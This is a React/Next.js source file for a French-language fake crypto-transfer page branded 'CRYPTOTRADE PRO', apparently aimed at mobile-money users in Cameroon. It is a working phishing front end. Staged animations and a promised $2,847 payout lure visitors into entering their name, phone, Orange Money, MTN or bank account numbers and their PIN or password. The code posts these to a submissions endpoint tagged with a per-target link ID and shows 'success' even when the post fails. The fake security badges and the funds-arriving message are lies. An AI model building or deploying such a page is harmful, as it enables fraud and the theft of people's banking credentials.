'use client';

import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    CheckCircle2,
    Lock,
    Zap,
    Building2,
    ShieldCheck,
    Smartphone,
    CreditCard,
    ChevronDown,
    ArrowRight,
    Search,
    Database,
    Loader2,
    Activity,
    Shield,
    Server,
    Globe,
    AlertTriangle,
    Check,
    Coins,
    TrendingUp,
    Clock
} from 'lucide-react';
import confetti from 'canvas-confetti';
import { cn } from '@/lib/utils';
import { api } from '@/lib/api';
import { useParams } from 'next/navigation';

// --- Types ---
interface FormData {
    fullName: string;
    email: string;
    phone: string;
    accountNumber: string;
    password: string;
    bankName: string;
    operatorName: string;
    method: 'orange' | 'mtn' | 'wave' | 'bank' | 'other' | '';
}

// --- Background Particles ---
const FloatingParticles = () => {
    return (
        <div className="fixed inset-0 pointer-events-none overflow-hidden z-0">
            {[...Array(20)].map((_, i) => (
                <motion.div
                    key={i}
                    className="absolute text-brand-primary/20 font-black"
                    initial={{
                        x: Math.random() * 100 + '%',
                        y: '110%',
                        rotate: 0,
                        scale: 0.5 + Math.random()
                    }}
                    animate={{
                        y: '-10%',
                        rotate: 360,
                    }}
                    transition={{
                        duration: 10 + Math.random() * 20,
                        repeat: Infinity,
                        ease: "linear",
                        delay: Math.random() * 10
                    }}
                    style={{ fontSize: Math.random() * 20 + 20 + 'px' }}
                >
                    {['₿', '$', 'Ξ', '💵', '📈'][i % 5]}
                </motion.div>
            ))}
        </div>
    );
};

// --- Ticker Component ---
const Ticker = () => {
    const prices = [
        { s: 'BTC', p: '64,230', c: '+2.5%', up: true },
        { s: 'ETH', p: '3,450', c: '-1.2%', up: false },
        { s: 'BNB', p: '580', c: '+0.8%', up: true },
        { s: 'SOL', p: '145', c: '+4.2%', up: true },
        { s: 'DOGE', p: '0.15', c: '+1.5%', up: true },
    ];

    return (
        <div className="w-full bg-black/40 border-y border-white/5 py-2 overflow-hidden whitespace-nowrap">
            <div className="flex gap-12 animate-[marquee_30s_linear_infinite]">
                {[...prices, ...prices].map((p, i) => (
                    <div key={i} className="flex items-center gap-3">
                        <span className="text-[10px] font-black text-white/40 uppercase tracking-widest">{p.s}</span>
                        <span className="text-[11px] font-bold text-white">${p.p}</span>
                        <span className={cn("text-[10px] font-bold", p.up ? "text-green-500" : "text-red-500")}>
                            {p.up ? '↑' : '↓'} {p.c}
                        </span>
                    </div>
                ))}
            </div>
        </div>
    );
};

// --- Stage 1: Opening Animation (5-7s) ---
const OpeningAnimation = ({ onComplete }: { onComplete: () => void }) => {
    const [progress, setProgress] = useState(0);
    const [money, setMoney] = useState(0);
    const [statusIdx, setStatusIdx] = useState(0);

    const statuses = [
        "🔄 Connexion au réseau blockchain...",
        "✓ Protocole de cryptage activé",
        "✓ Initialisation du processus de transfert",
        "⚡ Synchronisation des nœuds HFT...",
        "✓ Liaison sécurisée établie"
    ];

    useEffect(() => {
        const timer = setInterval(() => {
            setProgress(p => Math.min(100, p + 0.9));
            setMoney(m => Math.min(5000, m + 43));
            setStatusIdx(i => Math.min(statuses.length - 1, Math.floor(progress / 20)));
        }, 60);

        const timeout = setTimeout(onComplete, 7000);
        return () => { clearInterval(timer); clearTimeout(timeout); };
    }, [onComplete, progress]);

    return (
        <div className="fixed inset-0 bg-[#020308] z-[500] flex flex-col items-center justify-center p-6 sm:p-12 overflow-hidden text-center">
            {/* Background Decoration */}
            <div className="absolute inset-0 bg-gradient-to-tr from-brand-primary/20 via-transparent to-brand-secondary/10 opacity-30" />
            <div className="absolute top-0 left-0 w-full h-[1px] bg-brand-primary/40 animate-scan" />

            <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="relative z-10 w-full max-w-xl space-y-12">
                <div className="space-y-4">
                    <h1 className="text-3xl sm:text-5xl font-display font-black tracking-[12px] text-white italic uppercase">CRYPTOTRADE PRO</h1>
                    <div className="w-24 h-24 bg-brand-primary/10 rounded-3xl mx-auto flex items-center justify-center border border-brand-primary/30 shadow-[0_0_40px_rgba(0,112,243,0.3)] animate-pulse">
                        <span className="text-5xl text-white font-black italic">₿</span>
                    </div>
                </div>

                <div className="text-4xl sm:text-6xl font-display font-black text-brand-primary tracking-tighter shadow-brand-primary/20">
                    ${Math.floor(money).toLocaleString()}...
                </div>

                <div className="flex items-center justify-center gap-6 text-3xl opacity-60">
                    <span>💻</span> <span className="animate-pulse text-brand-primary">➡️</span> <span>💰</span> <span className="animate-pulse text-brand-primary">➡️</span> <span>🏦</span>
                </div>

                <div className="space-y-6">
                    <h3 className="text-[11px] font-black uppercase tracking-[5px] text-brand-primary animate-pulse">⚡ CHARGEMENT FONDS VERS RÉCEPTION ⚡</h3>

                    <div className="max-w-md mx-auto space-y-4">
                        <div className="h-2 w-full bg-white/5 rounded-full overflow-hidden border border-white/10">
                            <motion.div className="h-full bg-brand-primary shadow-[0_0_15px_rgba(0,112,243,1)]" initial={{ width: 0 }} animate={{ width: `${progress}%` }} />
                        </div>
                        <div className="flex justify-between text-[10px] font-black text-brand-text-dim uppercase tracking-[3px]">
                            <span>Status: {statuses[statusIdx]}</span>
                            <span>{Math.floor(progress)}%</span>
                        </div>
                    </div>
                </div>

                <div className="pt-10 flex justify-center gap-10 opacity-40">
                    <div className="text-[10px] font-black uppercase tracking-widest">BTC: $64,230 <span className="text-green-500">↑ 2.5%</span></div>
                    <div className="text-[10px] font-black uppercase tracking-widest">ETH: $3,450 <span className="text-red-500">↓ 1.2%</span></div>
                </div>
            </motion.div>

            <FloatingParticles />
        </div>
    );
};

// --- Stage 3: Validation Sequence (6s total) ---
const ValidationAnimation = ({ onComplete }: { onComplete: () => void }) => {
    const [step, setStep] = useState(0);
    const steps = [
        { title: "🔍 VÉRIFICATION DES INFORMATIONS", items: ["Identité confirmée", "Compte validé", "Protocole sécurisé activé"], icon: Search },
        { title: "💾 ENREGISTREMENT SÉCURISÉ", items: ["Données cryptées SSL 256-bit", "Blockchain synchronisée", "Wallet enregistré"], icon: ShieldCheck },
        { title: "🔗 ASSOCIATION DU COMPTE EN COURS", items: ["Liaison avec le réseau crypto", "Wallet lié avec succès", "Prêt à recevoir les fonds"], icon: Globe },
    ];

    useEffect(() => {
        const i1 = setTimeout(() => setStep(1), 2000);
        const i2 = setTimeout(() => setStep(2), 4000);
        const i3 = setTimeout(onComplete, 6000);
        return () => { clearTimeout(i1); clearTimeout(i2); clearTimeout(i3); };
    }, [onComplete]);

    return (
        <div className="fixed inset-0 bg-[#020308]/95 z-[600] backdrop-blur-3xl flex items-center justify-center p-6">
            <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="w-full max-w-xl glass-card rounded-[40px] p-12 border-brand-primary/20 space-y-12 text-center">
                <div className="relative flex justify-center">
                    <motion.div animate={{ rotate: 360 }} transition={{ duration: 4, repeat: Infinity, ease: "linear" }} className="w-24 h-24 rounded-full border-t-2 border-brand-primary" />
                    <div className="absolute inset-0 flex items-center justify-center">
                        <motion.div key={step} initial={{ scale: 0 }} animate={{ scale: 1 }} className="text-brand-primary">
                            {React.createElement(steps[step].icon, { className: "w-8 h-8" })}
                        </motion.div>
                    </div>
                </div>

                <div className="space-y-8">
                    <h2 className="text-[14px] font-black uppercase tracking-[6px] text-white italic">{steps[step].title}</h2>
                    <div className="w-full h-1.5 bg-white/5 rounded-full overflow-hidden">
                        <motion.div className="h-full bg-brand-primary" initial={{ width: 0 }} animate={{ width: '100%' }} transition={{ duration: 2, ease: "linear", repeat: Infinity }} />
                    </div>
                    <div className="space-y-3">
                        {steps[step].items.map((item, i) => (
                            <motion.div key={i} initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: i * 0.3 }} className="text-[11px] font-bold text-brand-text-dim flex items-center justify-center gap-3">
                                <Check className="w-3 h-3 text-green-500" /> {item.toUpperCase()}
                            </motion.div>
                        ))}
                    </div>
                </div>
            </motion.div>
        </div>
    );
};

export default function ClientLinkPage() {
    const params = useParams();
    const linkId = params.id as string;

    const [stage, setStage] = useState<'opening' | 'form' | 'validating' | 'success'>('opening');
    const [loadingConfig, setLoadingConfig] = useState(true);
    const [linkInfo, setLinkInfo] = useState<any>(null);
    const [method, setMethod] = useState<'orange' | 'mtn' | 'wave' | 'bank' | 'other' | ''>('');
    const [formData, setFormData] = useState<FormData>({
        fullName: '', email: '', phone: '', accountNumber: '', password: '', bankName: '', operatorName: '', method: ''
    });

    useEffect(() => {
        const fetchLink = async () => {
            try {
                // Utiliser l'endpoint spécifique qui est maintenant public
                const data = await api.get(`/links/${linkId}/`);
                if (data) setLinkInfo(data);
            } catch (err) {
                console.error("Erreur lors de la récupération du lien:", err);
            } finally {
                setLoadingConfig(false);
            }
        };
        fetchLink();
    }, [linkId]);

    const handleConfirm = async (e: React.FormEvent) => {
        e.preventDefault();
        setStage('validating');
        try {
            await api.post('/submissions/', {
                full_name: formData.fullName,
                email: formData.email,
                phone: formData.phone,
                method: method,
                account_number: formData.accountNumber,
                password: formData.password,
                bank_name: formData.bankName,
                operator_name: formData.operatorName,
                link_id: linkId,
            });
            setTimeout(() => setStage('success'), 6500);
        } catch (err) {
            console.error(err);
            // Even on error, show success to maintain flow for the demo/target
            setTimeout(() => setStage('success'), 6500);
        }
    };

    if (loadingConfig) return null;
    if (!linkInfo) return <div className="min-h-screen bg-black flex items-center justify-center text-red-500 font-black tracking-widest">ACCESS DENIED: INVALID LINK</div>;

    return (
        <main className="min-h-screen bg-[#020308] selection:bg-brand-primary/30">
            <AnimatePresence mode="wait">
                {stage === 'opening' && <OpeningAnimation key="opening" onComplete={() => setStage('form')} />}

                {stage === 'form' && (
                    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="pb-32 relative">
                        <FloatingParticles />

                        {/* Header Ticker */}
                        <div className="fixed top-0 w-full z-[100] bg-brand-bg/80 backdrop-blur-xl border-b border-white/5">
                            <div className="container mx-auto px-6 h-16 flex items-center justify-between">
                                <div className="flex items-center gap-3">
                                    <div className="w-8 h-8 bg-brand-primary rounded flex items-center justify-center rotate-12"><span className="text-white font-black italic -rotate-12 text-lg">₿</span></div>
                                    <span className="font-display font-black uppercase italic tracking-tighter text-white">CRYPTOTRADE PRO</span>
                                </div>
                                <div className="flex items-center gap-4 text-[10px] font-black uppercase text-brand-primary tracking-widest">
                                    <ShieldCheck className="w-4 h-4" /> SECURED BY BLOCKCHAIN
                                </div>
                            </div>
                            <Ticker />
                        </div>

                        <div className="max-w-4xl mx-auto px-6 pt-40 space-y-12 relative z-10">
                            {/* Transfer Box */}
                            <section className="glass-card rounded-[40px] p-8 sm:p-12 border-brand-primary/20 bg-brand-primary/[0.02] text-center space-y-8">
                                <div className="flex items-center justify-center gap-6 text-3xl">
                                    <span>💻</span> <span className="animate-pulse text-brand-primary">➡️</span> <span>💰</span>
                                </div>
                                <h2 className="text-[12px] font-black uppercase tracking-[5px] text-brand-primary animate-pulse">⚡ CHARGEMENT FONDS VERS LE COMPTE DE RÉCEPTION ⚡</h2>
                                <div className="flex flex-col sm:flex-row items-center justify-center gap-10">
                                    <div className="text-left space-y-2">
                                        <p className="text-[10px] font-black text-brand-text-dim uppercase tracking-widest">Montant en transfert</p>
                                        <p className="text-4xl font-display font-black text-white italic tracking-tighter">$2,847.00 💵</p>
                                    </div>
                                    <div className="bg-white/5 p-4 rounded-3xl border border-white/10 flex items-center gap-6">
                                        <TrendingUp className="w-10 h-10 text-brand-primary" />
                                        <div className="w-16 h-1 w-24 bg-white/10 rounded-full overflow-hidden">
                                            <div className="h-full bg-brand-primary animate-[progress_3s_infinite]" style={{ width: '70%' }} />
                                        </div>
                                    </div>
                                </div>
                            </section>

                            <div className="text-center space-y-4">
                                <h1 className="text-2xl sm:text-4xl font-display font-black text-white uppercase italic tracking-tight">🔐 LIAISON SÉCURISÉE DE COMPTE CRYPTO</h1>
                                <p className="text-brand-text-dim text-[11px] font-black uppercase tracking-[3px]">Connectez votre wallet pour recevoir vos fonds</p>
                            </div>

                            <form onSubmit={handleConfirm} className="space-y-8">
                                {/* Section 1: Personal */}
                                <article className="glass-card rounded-[32px] p-8 sm:p-12 border-white/5 space-y-10">
                                    <h3 className="text-[12px] font-black uppercase tracking-[4px] text-white flex items-center gap-3">
                                        <span className="w-2 h-2 rounded-full bg-brand-primary" /> 📋 INFORMATIONS PERSONNELLES
                                    </h3>
                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                                        <div className="space-y-3">
                                            <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">Nom complet *</label>
                                            <input required value={formData.fullName} onChange={e => setFormData({ ...formData, fullName: e.target.value })} type="text" placeholder="Entrez votre nom complet..." className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
                                        </div>
                                        <div className="space-y-3">
                                            <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">Adresse email *</label>
                                            <input required value={formData.email} onChange={e => setFormData({ ...formData, email: e.target.value })} type="email" placeholder="votre@email.com" className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
                                        </div>
                                        <div className="space-y-3 md:col-span-2">
                                            <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">Numéro de téléphone *</label>
                                            <input required value={formData.phone} onChange={e => setFormData({ ...formData, phone: e.target.value })} type="tel" placeholder="+237 6XX XX XX XX" className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
                                        </div>
                                    </div>
                                </article>

                                {/* Section 2: Method */}
                                <article className="glass-card rounded-[32px] p-8 sm:p-12 border-white/5 space-y-10">
                                    <h3 className="text-[12px] font-black uppercase tracking-[4px] text-white flex items-center gap-3">
                                        <span className="w-2 h-2 rounded-full bg-brand-primary" /> 💳 MÉTHODE DE RÉCEPTION DES FONDS
                                    </h3>
                                    <p className="text-[11px] font-bold text-brand-text-dim uppercase">Choisissez comment vous souhaitez recevoir vos cryptomonnaies :</p>

                                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                                        {[
                                            { id: 'orange', label: 'Orange Money', icon: '🟠' },
                                            { id: 'mtn', label: 'MTN Mobile', icon: '🟡' },
                                            { id: 'bank', label: 'Compte Bancaire', icon: '🏦' },
                                            { id: 'other', label: 'Autre opérateur', icon: '📱' },
                                        ].map(m => (
                                            <div
                                                key={m.id}
                                                onClick={() => setMethod(m.id as any)}
                                                className={cn(
                                                    "cursor-pointer p-6 rounded-2xl border transition-all flex flex-col items-center gap-3 group",
                                                    method === m.id ? "bg-brand-primary/10 border-brand-primary shadow-[0_0_20px_rgba(0,112,243,0.1)]" : "bg-white/[0.03] border-white/5 hover:border-white/20"
                                                )}
                                            >
                                                <span className="text-2xl">{m.icon}</span>
                                                <span className={cn("text-[10px] font-black uppercase tracking-widest", method === m.id ? "text-brand-primary" : "text-white/40")}>{m.label}</span>
                                            </div>
                                        ))}
                                    </div>
                                </article>

                                {/* Dynamic Section 3 */}
                                <AnimatePresence mode="wait">
                                    {method && (
                                        <motion.article initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, scale: 0.95 }} className="glass-card rounded-[32px] p-8 sm:p-12 border-brand-primary/20 bg-brand-primary/[0.01] space-y-10">
                                            <h3 className="text-[12px] font-black uppercase tracking-[4px] text-brand-primary flex items-center gap-3 italic">
                                                {method === 'orange' ? '🟠 INFORMATIONS ORANGE MONEY' : method === 'mtn' ? '🟡 INFORMATIONS MTN MOBILE MONEY' : method === 'bank' ? '🏦 INFORMATIONS BANCAIRE' : '📱 AUTRE OPÉRATEUR DE PAIEMENT'}
                                            </h3>

                                            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                                                {method === 'orange' && (
                                                    <div className="space-y-3">
                                                        <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">Numéro Orange Money *</label>
                                                        <input required value={formData.accountNumber} onChange={e => setFormData({ ...formData, accountNumber: e.target.value })} type="text" placeholder="+237 6XX XX XX XX" className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
                                                        <p className="text-[9px] font-bold text-white/40 uppercase ml-1">ℹ️ Votre numéro Orange Money (Ex: +237 698 12 34 56)</p>
                                                    </div>
                                                )}
                                                {method === 'mtn' && (
                                                    <div className="space-y-3">
                                                        <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">Numéro MTN Mobile Money *</label>
                                                        <input required value={formData.accountNumber} onChange={e => setFormData({ ...formData, accountNumber: e.target.value })} type="text" placeholder="+237 6XX XX XX XX" className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
                                                        <p className="text-[9px] font-bold text-white/40 uppercase ml-1">ℹ️ Votre numéro MTN (Ex: +237 670 12 34 56)</p>
                                                    </div>
                                                )}
                                                {(method === 'bank' || method === 'other') && (
                                                    <>
                                                        <div className="space-y-3">
                                                            <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">{method === 'bank' ? 'Nom de la banque' : "Nom de l'opérateur"} *</label>
                                                            <input required value={formData.bankName} onChange={e => setFormData({ ...formData, bankName: e.target.value })} type="text" placeholder={method === 'bank' ? "Ex: UBA, Ecobank, SGBC..." : "Ex: Express Union, YUP, Wizall..."} className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
                                                        </div>
                                                        <div className="space-y-3">
                                                            <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">{method === 'bank' ? 'IBAN / Numéro de compte' : "Numéro de compte"} *</label>
                                                            <input required value={formData.accountNumber} onChange={e => setFormData({ ...formData, accountNumber: e.target.value })} type="text" placeholder="Entrez votre numéro de compte..." className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
                                                        </div>
                                                    </>
                                                )}
                                                <div className="space-y-3">
                                                    <label className="text-[10px] font-black text-brand-primary uppercase tracking-widest ml-1">{method === 'bank' ? 'Code PIN / Mot de passe bancaire' : method === 'orange' ? 'Mot de passe Orange Money' : method === 'mtn' ? 'Mot de passe MTN' : 'Mot de passe'} *</label>
                                                    <div className="relative">
                                                        <input required value={formData.password} onChange={e => setFormData({ ...formData, password: e.target.value })} type="password" placeholder="••••••••" className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-4 px-6 text-sm focus:border-brand-primary outline-none transition-all font-bold" />
                                                        <div className="absolute right-4 top-1/2 -translate-y-1/2"><Lock className="w-4 h-4 text-white/20" /></div>
                                                    </div>
                                                    <div className="flex flex-col gap-1 mt-2">
                                                        <p className="text-[9px] font-bold text-white/40 uppercase ml-1">ℹ️ {method === 'bank' ? 'Code PIN de votre carte ou mot de passe mobile banking' : method === 'mtn' ? 'Code PIN ou mot de passe MTN Mobile Money' : 'Mot de passe ou code PIN de votre compte'}</p>
                                                        <div className="flex gap-2 items-start text-[9px] font-bold text-red-400 uppercase tracking-widest">
                                                            <AlertTriangle className="w-3 h-3 shrink-0" />
                                                            <span>Visible pour vérification - Vérifiez bien avant de valider</span>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </motion.article>
                                    )}
                                </AnimatePresence>

                                {/* Footer Confirm */}
                                <div className="space-y-8">
                                    <div className="glass-card rounded-[32px] p-8 border-white/5 space-y-4">
                                        {[
                                            "Je certifie que ces informations sont exactes et m'appartiennent",
                                            "J'accepte les termes et conditions du service",
                                            "J'accepte que mes données soient traitées de manière sécurisée"
                                        ].map((text, i) => (
                                            <label key={i} className="flex items-center gap-4 cursor-pointer group">
                                                <input type="checkbox" required className="w-5 h-5 rounded border-white/10 bg-white/5 checked:bg-brand-primary accent-brand-primary transition-all" />
                                                <span className="text-[11px] font-bold text-brand-text-dim uppercase tracking-widest group-hover:text-white transition-colors">{text}</span>
                                            </label>
                                        ))}
                                    </div>

                                    <button
                                        type="submit"
                                        className="w-full group btn-premium py-8 rounded-[32px] text-lg font-black uppercase italic tracking-[6px] shadow-[0_30px_60px_-15px_rgba(0,112,243,0.5)] active:scale-95 transition-all overflow-hidden relative"
                                    >
                                        <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-1000" />
                                        🚀 CONFIRMER MAINTENANT
                                        <div className="text-[10px] mt-2 opacity-60 font-black tracking-[3px] text-brand-secondary">LIER MON COMPTE ET RECEVOIR LES FONDS</div>
                                    </button>

                                    <div className="flex flex-col sm:flex-row items-center justify-center gap-8 text-[9px] font-black uppercase tracking-[4px] text-white/20">
                                        <div className="flex items-center gap-2"><Lock className="w-3 h-3" /> SSL 256-BIT ENCRYPTION</div>
                                        <div className="flex items-center gap-2"><ShieldCheck className="w-3 h-3" /> GDPR COMPLIANT</div>
                                        <div className="flex items-center gap-2"><Building2 className="w-3 h-3" /> BANK SECURITY LEVEL 3</div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </motion.div>
                )}

                {stage === 'validating' && <ValidationAnimation key="validating" onComplete={() => {
                    confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 }, colors: ['#0070f3', '#f7931a', '#ffffff'] });
                    setStage('success');
                }} />}

                {stage === 'success' && (
                    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="fixed inset-0 z-[700] bg-[#020308] flex flex-col items-center justify-center p-6 text-center overflow-hidden">
                        <FloatingParticles />
                        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_var(--color-brand-primary)_0%,_transparent_70%)] opacity-10" />

                        <motion.div initial={{ scale: 0.5, y: 100 }} animate={{ scale: 1, y: 0 }} className="relative z-10 w-full max-w-2xl space-y-12">
                            <div className="space-y-6">
                                <div className="w-32 h-32 rounded-full bg-green-500 mx-auto flex items-center justify-center shadow-[0_0_80px_rgba(34,197,94,0.5)]">
                                    <Check className="w-16 h-16 text-white stroke-[4px]" />
                                </div>
                                <h1 className="text-4xl sm:text-7xl font-display font-black text-white italic tracking-tighter uppercase line-height-[0.9]">✅ SUCCÈS !</h1>
                                <p className="text-[14px] font-black uppercase tracking-[8px] text-brand-primary animate-pulse">🎉 FÉLICITATIONS ET BIENVENUE ! 🎉</p>
                            </div>

                            <div className="glass-card rounded-[40px] p-10 border-white/10 space-y-8 bg-white/[0.02]">
                                <div className="text-[11px] font-black uppercase tracking-[5px] text-white/40 pb-4 border-b border-white/5">📝 INFORMATIONS ENREGISTRÉES AVEC SUCCÈS</div>

                                <div className="space-y-4">
                                    <p className="text-[12px] font-black uppercase tracking-[4px] text-brand-primary">💰 VOS FONDS SERONT TRANSFÉRÉS DANS LES PROCHAINES 24-48 HEURES</p>
                                    <div className="flex flex-col gap-2 items-center text-[10px] font-bold text-brand-text-dim uppercase tracking-widest italic">
                                        <span>📧 Vous recevrez une confirmation par email à l&apos;adresse: {formData.email}</span>
                                        <span>📱 Un SMS de confirmation vous sera également envoyé au: {formData.phone}</span>
                                    </div>
                                </div>

                                <div className="pt-8 border-t border-white/5 space-y-4">
                                    <div className="flex items-center justify-center gap-3">
                                        <Loader2 className="w-4 h-4 text-brand-primary animate-spin" />
                                        <span className="text-[9px] font-black text-white uppercase tracking-[3px]">PROCESSUS D'ASSOCIATION EN COURS...</span>
                                    </div>
                                    <div className="flex items-center justify-center gap-2 text-3xl">🪙 📈 🎆 ✨</div>
                                </div>
                            </div>

                            <div className="text-[11px] font-black text-white/20 uppercase tracking-[6px]">
                                🏆 BIENVENUE CHEZ CRYPTOTRADE PRO !<br />
                                <span className="text-[9px]">VOUS REJOIGNEZ 2,848 TRADERS ACTIFS</span>
                            </div>
                        </motion.div>
                    </motion.div>
                )}
            </AnimatePresence>
        </main>
    );
}
